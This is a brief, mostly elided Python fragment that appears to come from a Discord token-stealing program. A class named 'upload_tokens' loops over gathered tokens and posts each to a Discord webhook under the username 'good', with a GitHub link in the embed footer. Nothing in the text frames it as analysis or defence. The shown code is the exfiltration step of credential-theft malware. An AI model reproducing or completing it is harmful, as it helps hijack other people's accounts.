...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.set_footer(text="https://github.com/hategirls")

            self.webhook.send(embed=embed, username="good", avatar_url="https://media.discordapp.net/attachments/608711474952798221/1093576854125957320/Gifx_2.jpg?width=265&height=265")
